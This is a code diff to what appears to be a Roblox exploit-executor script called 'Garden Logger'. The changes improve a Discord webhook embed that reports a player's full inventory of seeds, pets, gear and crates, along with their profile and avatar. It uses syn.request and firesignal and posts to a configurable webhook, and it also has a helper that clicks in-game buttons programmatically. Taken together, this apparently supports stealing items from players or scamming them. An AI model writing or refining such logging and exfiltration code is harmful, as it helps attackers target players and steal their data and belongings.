@@ -25,6 +25,8 @@ if topNotification then
 	topNotification:Destroy()
 end
 
+local requestFunc = (syn and syn.request) or (http and http.request) or request
+
 local function safeClick(button)
 	if not button then return end
 	pcall(function() firesignal(button.Activated) end)
@@ -169,6 +171,43 @@ local function getFullSnapshot()
 	return buckets, counts, total
 end
 
+-- Fetch real CDN headshot + bust URLs from Roblox's thumbnail API
+local function getHeadshotUrl(userId)
+	local fallback = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
+	if not requestFunc then return fallback end
+	local ok, response = pcall(function()
+		return requestFunc({
+			Url    = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. userId .. "&size=420x420&format=Png&isCircular=false",
+			Method = "GET",
+		})
+	end)
+	if ok and response and response.Body then
+		local ok2, data = pcall(function() return HttpService:JSONDecode(response.Body) end)
+		if ok2 and data and data.data and data.data[1] and data.data[1].imageUrl then
+			return data.data[1].imageUrl
+		end
+	end
+	return fallback
+end
+
+local function getAvatarBustUrl(userId)
+	local fallback = "https://www.roblox.com/bust-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
+	if not requestFunc then return fallback end
+	local ok, response = pcall(function()
+		return requestFunc({
+			Url    = "https://thumbnails.roblox.com/v1/users/avatar-bust?userIds=" .. userId .. "&size=420x420&format=Png&isCircular=false",
+			Method = "GET",
+		})
+	end)
+	if ok and response and response.Body then
+		local ok2, data = pcall(function() return HttpService:JSONDecode(response.Body) end)
+		if ok2 and data and data.data and data.data[1] and data.data[1].imageUrl then
+			return data.data[1].imageUrl
+		end
+	end
+	return fallback
+end
+
 local AllItems, petUUIDs = getValidItems()
 local displayCounts = {}
 local totalItems    = 0
@@ -197,11 +236,9 @@ local function sendSnapshotEmbed()
 	local function types(list) return #list end
 	local function inlineCode(v) return "`" .. tostring(v) .. "`" end
 
-	local avatarUrl = string.format(
-		"https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png",
-		localPlayer.UserId
-	)
-	local profileUrl = "https://www.roblox.com/users/" .. localPlayer.UserId .. "/profile"
+	local headshotUrl = getHeadshotUrl(localPlayer.UserId)
+	local bustUrl     = getAvatarBustUrl(localPlayer.UserId)
+	local profileUrl  = "https://www.roblox.com/users/" .. localPlayer.UserId .. "/profile"
 
 	local totalsValue = string.format(
 		"🌿 Seeds: `%d`  •  🐾 Pets: `%d`  •  🛠️ Gear: `%d`\n📦 Crates: `%d`  •  ⚔️ Equipped: `%d`  •  ❓ Other: `%d`",
@@ -242,28 +279,27 @@ local function sendSnapshotEmbed()
 
 	local payload = HttpService:JSONEncode({
 		username   = "Garden Logger",
-		avatar_url = avatarUrl,
+		avatar_url = headshotUrl,
 		embeds = {{
 			author = {
 				name     = localPlayer.DisplayName .. " • @" .. localPlayer.Name,
-				icon_url = avatarUrl,
+				icon_url = headshotUrl,
 				url      = profileUrl,
 			},
 			title       = "🌱 Inventory Snapshot",
 			url         = profileUrl,
 			description = "```ansi\n\27[1;32mPlayer joined — full backpack scan captured.\27[0m\n```",
 			color       = 5763719,
-			thumbnail   = { url = avatarUrl },
+			thumbnail   = { url = bustUrl },
 			fields      = fields,
 			footer      = {
 				text     = "Garden Logger • " .. totalAll .. " total items",
-				icon_url = avatarUrl,
+				icon_url = headshotUrl,
 			},
 			timestamp = DateTime.now():ToIsoDate(),
 		}},
 	})
 
-	local requestFunc = (syn and syn.request) or (http and http.request) or request
 	pcall(function()
 		requestFunc({
 			Url     = getgenv().WEBHOOK_URL,
